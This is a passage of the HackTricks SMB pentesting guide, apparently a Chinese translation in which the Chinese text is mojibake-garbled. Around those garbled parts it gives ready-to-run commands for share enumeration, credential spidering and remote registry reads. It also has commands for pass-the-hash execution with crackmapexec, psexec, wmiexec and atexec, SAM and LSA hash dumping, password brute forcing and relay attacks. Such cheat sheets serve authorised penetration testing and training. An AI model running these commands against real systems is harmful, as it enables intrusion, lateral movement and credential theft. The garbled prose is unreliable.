- **smbclient**ï¼šç”¨äºä¸SMBå…±äº«æ–‡ä»¶å¤¹è¿›è¡Œäº¤äº’çš„å·¥å…·ï¼Œå¯ä¸Šä¼ ã€ä¸‹è½½å’Œåˆ é™¤æ–‡ä»¶ã€‚
- **smbget**ï¼šç”¨äºä»SMBå…±äº«æ–‡ä»¶å¤¹ä¸‹è½½æ–‡ä»¶çš„å·¥å…·ã€‚
- **smbmount**ï¼šç”¨äºå°†SMBå…±äº«æ–‡ä»¶å¤¹æŒ‚è½½åˆ°æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿçš„å·¥å…·ã€‚
- **Hydra**ï¼šç”¨äºè¿›è¡Œå¼±å£ä»¤æ”»å‡»çš„å·¥å…·ï¼Œå¯çŒœè§£SMBæœåŠ¡çš„ç”¨æˆ·åå’Œå¯†ç ã€‚
- **Medusa**ï¼šç”¨äºè¿›è¡Œå¼±å£ä»¤æ”»å‡»çš„å·¥å…·ï¼Œæ”¯æŒå¤šç§åè®®ï¼ŒåŒ…æ‹¬SMBã€‚
- **CrackMapExec**ï¼šç”¨äºè¿›è¡Œå¼±å£ä»¤æ”»å‡»å’Œæ¼æ´åˆ©ç”¨çš„å·¥å…·ï¼Œæ”¯æŒå¤šç§åè®®ï¼ŒåŒ…æ‹¬SMBã€‚
```bash
smbclient -U '%' -N \\\\192.168.0.24\\im_clearly_not_here # returns NT_STATUS_BAD_NETWORK_NAME
smbclient -U '%' -N \\\\192.168.0.24\\ADMIN$ # returns NT_STATUS_ACCESS_DENIED or even gives you a session
```
### æŒ‚è½½å…±äº«æ–‡ä»¶å¤¹

To mount a shared folder, you can use the `mount` command in Linux or the `net use` command in Windows.

#### Linux

In Linux, you can use the `mount` command to mount a shared folder. The syntax is as follows:

```bash
mount -t cifs //<IP_address>/<shared_folder> <mount_point> -o username=<username>,password=<password>
```

Replace `<IP_address>` with the IP address of the machine hosting the shared folder, `<shared_folder>` with the name of the shared folder, `<mount_point>` with the directory where you want to mount the shared folder, `<username>` with the username required to access the shared folder, and `<password>` with the corresponding password.

#### Windows

In Windows, you can use the `net use` command to mount a shared folder. The syntax is as follows:

```bash
net use <drive_letter>: \\<IP_address>\<shared_folder> /user:<username> <password>
```

Replace `<drive_letter>` with the desired drive letter for the mounted folder, `<IP_address>` with the IP address of the machine hosting the shared folder, `<shared_folder>` with the name of the shared folder, `<username>` with the username required to access the shared folder, and `<password>` with the corresponding password.
```bash
mount -t cifs //x.x.x.x/share /mnt/share
mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share
```
### **ä¸‹è½½æ–‡ä»¶**

é˜…è¯»å‰é¢çš„ç« èŠ‚ä»¥äº†è§£å¦‚ä½•ä½¿ç”¨å‡­æ®/Pass-the-Hashè¿æ¥ã€‚
```bash
#Search a file and download
sudo smbmap -R Folder -H <IP> -A <FileName> -q # Search the file in recursive mode and download it inside /usr/share/smbmap
```

```bash
#Download all
smbclient //<IP>/<share>
> mask ""
> recurse
> prompt
> mget *
#Download everything to current directory
```
å‘½ä»¤ï¼š

* maskï¼šæŒ‡å®šç”¨äºè¿‡æ»¤ç›®å½•ä¸­æ–‡ä»¶çš„æ©ç ï¼ˆä¾‹å¦‚ï¼Œ""è¡¨ç¤ºæ‰€æœ‰æ–‡ä»¶ï¼‰
* recurseï¼šåˆ‡æ¢é€’å½’ï¼ˆé»˜è®¤å…³é—­ï¼‰
* promptï¼šåˆ‡æ¢æ–‡ä»¶åæç¤ºï¼ˆé»˜è®¤å¼€å¯ï¼‰
* mgetï¼šä»ä¸»æœºå¤åˆ¶ä¸æ©ç åŒ¹é…çš„æ‰€æœ‰æ–‡ä»¶åˆ°å®¢æˆ·æœº

ï¼ˆ_æ¥è‡ªsmbclientçš„manpageçš„ä¿¡æ¯_ï¼‰

### åŸŸå…±äº«æ–‡ä»¶å¤¹æœç´¢

* [**Snaffler**](https://github.com/SnaffCon/Snaffler)****
```bash
Snaffler.exe -s -d domain.local -o snaffler.log -v data
```
* [**CrackMapExec**](https://wiki.porchetta.industries/smb-protocol/spidering-shares) èœ˜è››ã€‚
* `-M spider_plus [--share <share_name>]`
* `--pattern txt`
```bash
sudo crackmapexec smb 10.10.10.10 -u username -p pass -M spider_plus --share 'Department Shares'
```
ç‰¹åˆ«æœ‰è¶£çš„æ˜¯å…±äº«æ–‡ä»¶ä¸­çš„åä¸º**`Registry.xml`**çš„æ–‡ä»¶ï¼Œå› ä¸ºå®ƒä»¬**å¯èƒ½åŒ…å«**é€šè¿‡ç»„ç­–ç•¥é…ç½®äº†**è‡ªåŠ¨ç™»å½•**çš„ç”¨æˆ·çš„å¯†ç ã€‚æˆ–è€…åä¸º**`web.config`**çš„æ–‡ä»¶ï¼Œå› ä¸ºå®ƒä»¬åŒ…å«äº†å‡­æ®ä¿¡æ¯ã€‚

{% hint style="info" %}
**SYSVOLå…±äº«**å¯ä»¥è¢«åŸŸä¸­çš„æ‰€æœ‰ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·**è¯»å–**ã€‚åœ¨å…¶ä¸­ï¼Œæ‚¨å¯èƒ½ä¼š**æ‰¾åˆ°**è®¸å¤šä¸åŒçš„æ‰¹å¤„ç†ã€VBScriptå’ŒPowerShell**è„šæœ¬**ã€‚\
æ‚¨åº”è¯¥**æ£€æŸ¥**å…¶ä¸­çš„è„šæœ¬ï¼Œå› ä¸ºæ‚¨å¯èƒ½ä¼š**æ‰¾åˆ°**æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚**å¯†ç **ã€‚
{% endhint %}

## è¯»å–æ³¨å†Œè¡¨

æ‚¨å¯ä»¥ä½¿ç”¨ä¸€äº›å‘ç°çš„å‡­æ®æ¥**è¯»å–æ³¨å†Œè¡¨**ã€‚Impacketçš„**`reg.py`**å·¥å…·å…è®¸æ‚¨å°è¯•ï¼š
```bash
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s
```
## åæ¸—é€

**Samba** æœåŠ¡å™¨çš„**é»˜è®¤é…ç½®**é€šå¸¸ä½äº `/etc/samba/smb.conf`ï¼Œå¯èƒ½åŒ…å«ä¸€äº›**å±é™©çš„é…ç½®**ï¼š

| **è®¾ç½®**                   | **æè¿°**                                                         |
| ------------------------- | ----------------------------------------------------------------- |
| `browseable = yes`        | å…è®¸åˆ—å‡ºå½“å‰å…±äº«ä¸­å¯ç”¨çš„å…±äº«ï¼Ÿ                                    |
| `read only = no`          | ç¦æ­¢åˆ›å»ºå’Œä¿®æ”¹æ–‡ä»¶ï¼Ÿ                                             |
| `writable = yes`          | å…è®¸ç”¨æˆ·åˆ›å»ºå’Œä¿®æ”¹æ–‡ä»¶ï¼Ÿ                                         |
| `guest ok = yes`          | å…è®¸åœ¨ä¸ä½¿ç”¨å¯†ç çš„æƒ…å†µä¸‹è¿æ¥åˆ°æœåŠ¡ï¼Ÿ                              |
| `enable privileges = yes` | æ˜¯å¦éµå®ˆåˆ†é…ç»™ç‰¹å®š SID çš„æƒé™ï¼Ÿ                                  |
| `create mask = 0777`      | æ–°åˆ›å»ºçš„æ–‡ä»¶å¿…é¡»åˆ†é…çš„æƒé™æ˜¯ä»€ä¹ˆï¼Ÿ                                |
| `directory mask = 0777`   | æ–°åˆ›å»ºçš„ç›®å½•å¿…é¡»åˆ†é…çš„æƒé™æ˜¯ä»€ä¹ˆï¼Ÿ                                |
| `logon script = script.sh` | ç”¨æˆ·ç™»å½•æ—¶éœ€è¦æ‰§è¡Œçš„è„šæœ¬æ˜¯ä»€ä¹ˆï¼Ÿ                                  |
| `magic script = script.sh` | å½“è„šæœ¬å…³é—­æ—¶åº”æ‰§è¡Œå“ªä¸ªè„šæœ¬ï¼Ÿ                                      |
| `magic output = script.out`| é­”æœ¯è„šæœ¬çš„è¾“å‡ºåº”å­˜å‚¨åœ¨å“ªé‡Œï¼Ÿ                                    |

å‘½ä»¤ `smbstatus` æä¾›æœ‰å…³**æœåŠ¡å™¨**å’Œ**å·²è¿æ¥ç”¨æˆ·**çš„ä¿¡æ¯ã€‚

## ä½¿ç”¨ Kerberos è¿›è¡Œèº«ä»½éªŒè¯

æ‚¨å¯ä»¥ä½¿ç”¨å·¥å…· **smbclient** å’Œ **rpcclient** è¿›è¡Œå¯¹ **Kerberos** çš„èº«ä»½éªŒè¯ï¼š
```bash
smbclient --kerberos //ws01win10.domain.com/C$
rpcclient -k ws01win10.domain.com
```
## **æ‰§è¡Œå‘½ä»¤**

### **crackmapexec**

crackmapexecå¯ä»¥åˆ©ç”¨**mmcexecï¼Œsmbexecï¼Œatexecï¼Œwmiexec**ä¸­çš„ä»»ä½•ä¸€ä¸ªæ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤ï¼Œå…¶ä¸­**wmiexec**æ˜¯**é»˜è®¤**æ–¹æ³•ã€‚æ‚¨å¯ä»¥ä½¿ç”¨å‚æ•°`--exec-method`æŒ‡å®šæ‚¨å¸Œæœ›ä½¿ç”¨çš„é€‰é¡¹ï¼š
```bash
apt-get install crackmapexec

crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd
crackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #Pass-the-Hash
# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions #Get sessions (
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users #Get logged-on users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks #Enumerate the disks
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users #Enumerate users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups # Enumerate groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups # Enumerate local groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol #Get password policy
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute #RID brute

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -H <HASH> #Pass-The-Hash
```
### [**psexec**](../windows-hardening/ntlm/psexec-and-winexec.md)**/**[**smbexec**](../windows-hardening/ntlm/smbexec.md)

è¿™ä¸¤ä¸ªé€‰é¡¹éƒ½ä¼šåœ¨å—å®³è€…æœºå™¨ä¸Š**åˆ›å»ºä¸€ä¸ªæ–°çš„æœåŠ¡**ï¼ˆé€šè¿‡SMBä½¿ç”¨ _\pipe\svcctl_ï¼‰ï¼Œå¹¶ä½¿ç”¨å®ƒæ¥**æ‰§è¡ŒæŸäº›æ“ä½œ**ï¼ˆ**psexec**å°†**ä¸Šä¼ **ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶åˆ°ADMIN$å…±äº«ï¼Œè€Œ**smbexec**å°†æŒ‡å‘**cmd.exe/powershell.exe**å¹¶å°†è´Ÿè½½æ”¾åœ¨å‚æ•°ä¸­ --**æ— æ–‡ä»¶æŠ€æœ¯-**-ï¼‰ã€‚\
æœ‰å…³[**psexec**](../windows-hardening/ntlm/psexec-and-winexec.md)å’Œ[**smbexec**](../windows-hardening/ntlm/smbexec.md)çš„**æ›´å¤šä¿¡æ¯**ã€‚\
åœ¨**kali**ä¸­ï¼Œå®ƒä½äº /usr/share/doc/python3-impacket/examples/ã€‚
```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash
```
ä½¿ç”¨**å‚æ•°**`-k`ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨**Kerberos**è¿›è¡Œèº«ä»½éªŒè¯ï¼Œè€Œä¸æ˜¯**NTLM**ã€‚

### [wmiexec](../windows-hardening/ntlm/wmicexec.md)/dcomexec

é€šè¿‡**ç«¯å£135**ä½¿ç”¨DCOMæ¥æ‰§è¡Œå‘½ä»¤è¡Œï¼Œè€Œæ— éœ€è§¦ç¢°ç£ç›˜æˆ–è¿è¡Œæ–°æœåŠ¡ï¼Œä»¥éšè”½æ–¹å¼æ‰§è¡Œã€‚\
åœ¨**kali**ä¸Šï¼Œå®ƒä½äº/usr/share/doc/python3-impacket/examples/ç›®å½•ä¸‹ã€‚
```bash
#If no password is provided, it will be prompted
./wmiexec.py [[domain/]username[:password]@]<targetName or address> #Prompt for password
./wmiexec.py -hashes LM:NT administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
```
ä½¿ç”¨**å‚æ•°**`-k`ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨**Kerberos**è¿›è¡Œèº«ä»½éªŒè¯ï¼Œè€Œä¸æ˜¯**NTLM**ã€‚
```bash
#If no password is provided, it will be prompted
./dcomexec.py [[domain/]username[:password]@]<targetName or address>
./dcomexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
```
### [AtExec](../windows-hardening/ntlm/atexec.md)

é€šè¿‡ä»»åŠ¡è®¡åˆ’ç¨‹åºæ‰§è¡Œå‘½ä»¤ï¼ˆä½¿ç”¨ SMB ä¸Šçš„ _\pipe\atsvc_ï¼‰ã€‚\
åœ¨ **kali** ä¸Šï¼Œå®ƒä½äº /usr/share/doc/python3-impacket/examples/ã€‚
```bash
./atexec.py [[domain/]username[:password]@]<targetName or address> "command"
./atexec.py -hashes <LM:NT> administrator@10.10.10.175 "whoami"
```
## Impacketå‚è€ƒ

[https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)

## **æš´åŠ›ç ´è§£ç”¨æˆ·å‡­è¯**

**ä¸æ¨èä½¿ç”¨æ­¤æ–¹æ³•ï¼Œå¦‚æœå°è¯•æ¬¡æ•°è¶…è¿‡å…è®¸çš„æœ€å¤§æ¬¡æ•°ï¼Œå¯èƒ½ä¼šå¯¼è‡´è´¦æˆ·è¢«å°é”**
```bash
nmap --script smb-brute -p 445 <IP>
ridenum.py <IP> 500 50000 /root/passwds.txt #Get usernames bruteforcing that rids and then try to bruteforce each user name
```
## SMBä¸­ç»§æ”»å‡»

è¯¥æ”»å‡»åˆ©ç”¨Responderå·¥å…·åŒ…åœ¨å†…éƒ¨ç½‘ç»œä¸Š**æ•è·SMBèº«ä»½éªŒè¯ä¼šè¯**ï¼Œå¹¶å°†å…¶**ä¸­ç»§**åˆ°**ç›®æ ‡æœºå™¨**ã€‚å¦‚æœèº«ä»½éªŒè¯**ä¼šè¯æˆåŠŸ**ï¼Œå®ƒå°†è‡ªåŠ¨å°†æ‚¨ç½®äº**ç³»ç»Ÿ**çš„**shell**ä¸­ã€‚\
[**åœ¨æ­¤å¤„è·å–æœ‰å…³æ­¤æ”»å‡»çš„æ›´å¤šä¿¡æ¯ã€‚**](../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

## SMB-Trap

å½“é¡µé¢å°è¯•é€šè¿‡SMBè®¿é—®æŸäº›å†…å®¹æ—¶ï¼ŒWindowsåº“URLMon.dllä¼šè‡ªåŠ¨å°è¯•å¯¹ä¸»æœºè¿›è¡Œèº«ä»½éªŒè¯ï¼Œä¾‹å¦‚ï¼š`img src="\\10.10.10.10\path\image.jpg"`

è¿™å‘ç”Ÿåœ¨ä»¥ä¸‹åŠŸèƒ½ä¸­ï¼š

* URLDownloadToFile
* URLDownloadToCache
* URLOpenStream
* URLOpenBlockingStream

è¿™äº›åŠŸèƒ½ç”±ä¸€äº›æµè§ˆå™¨å’Œå·¥å…·ï¼ˆå¦‚Skypeï¼‰ä½¿ç”¨

![æ¥æºï¼šhttp://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../.gitbook/assets/image (93).png>)

### ä½¿ç”¨MitMfçš„SMBTrap

![æ¥æºï¼šhttp://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../.gitbook/assets/image (94).png>)

## NTLMç›—çªƒ

ä¸SMBé™·é˜±ç±»ä¼¼ï¼Œé€šè¿‡å°†æ¶æ„æ–‡ä»¶æ¤å…¥ç›®æ ‡ç³»ç»Ÿï¼ˆä¾‹å¦‚é€šè¿‡SMBï¼‰å¯ä»¥å¼•å‘SMBèº«ä»½éªŒè¯å°è¯•ï¼Œä»è€Œå…è®¸ä½¿ç”¨è¯¸å¦‚Responderä¹‹ç±»çš„å·¥å…·æ‹¦æˆªNetNTLMv2å“ˆå¸Œã€‚ç„¶åå¯ä»¥ç¦»çº¿ç ´è§£å“ˆå¸Œæˆ–åœ¨[SMBä¸­ç»§æ”»å‡»](pentesting-smb.md#smb-relay-attack)ä¸­ä½¿ç”¨ã€‚

[å‚è§ï¼šntlm\_theft](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#ntlm\_theft)

## HackTricksè‡ªåŠ¨å‘½ä»¤
```
Protocol_Name: SMB    #Protocol Abbreviation if there is one.
Port_Number:  137,138,139     #Comma separated if there is more than one.
Protocol_Description: Server Message Block         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMB
Note: |
While Port 139 is known technically as â€˜NBT over IPâ€™, Port 445 is â€˜SMB over IPâ€™. SMB stands for â€˜Server Message Blocksâ€™. Server Message Block in modern language is also known as Common Internet File System. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.

#These are the commands I run in order every time I see an open SMB port

With No Creds
nbtscan {IP}
smbmap -H {IP}
smbmap -H {IP} -u null -p null
smbmap -H {IP} -u guest
smbclient -N -L //{IP}
smbclient -N //{IP}/ --option="client min protocol"=LANMAN1
rpcclient {IP}
rpcclient -U "" {IP}
crackmapexec smb {IP}
crackmapexec smb {IP} --pass-pol -u "" -p ""
crackmapexec smb {IP} --pass-pol -u "guest" -p ""
GetADUsers.py -dc-ip {IP} "{Domain_Name}/" -all
GetNPUsers.py -dc-ip {IP} -request "{Domain_Name}/" -format hashcat
GetUserSPNs.py -dc-ip {IP} -request "{Domain_Name}/"
getArch.py -target {IP}

With Creds
smbmap -H {IP} -u {Username} -p {Password}
smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP}
smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP} --pw-nt-hash `hash`
crackmapexec smb {IP} -u {Username} -p {Password} --shares
GetADUsers.py {Domain_Name}/{Username}:{Password} -all
GetNPUsers.py {Domain_Name}/{Username}:{Password} -request -format hashcat
GetUserSPNs.py {Domain_Name}/{Username}:{Password} -request

https://book.hacktricks.xyz/pentesting/pentesting-smb

Entry_2:
Name: Enum4Linux
Description: General SMB Scan
Command: enum4linux -a {IP}

Entry_3:
Name: Nmap SMB Scan 1
Description: SMB Vuln Scan With Nmap
Command: nmap -p 139,445 -vv -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse {IP}

Entry_4:
Name: Nmap Smb Scan 2
Description: SMB Vuln Scan With Nmap (Less Specific)
Command: nmap --script smb-vuln* -Pn -p 139,445 {IP}

Entry_5:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} {IP} smb

Entry_6:
Name: SMB/SMB2 139/445 consolesless mfs enumeration
Description: SMB/SMB2 139/445  enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 445; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 445; run; exit'

```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨ HackTricks ä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–æœ€æ–°ç‰ˆæœ¬çš„ PEASS æˆ–ä¸‹è½½ HackTricks çš„ PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**æ¨ç‰¹**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘ [hacktricks ä»“åº“](https://github.com/carlospolop/hacktricks) å’Œ [hacktricks-cloud ä»“åº“](https://github.com/carlospolop/hacktricks-cloud) æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
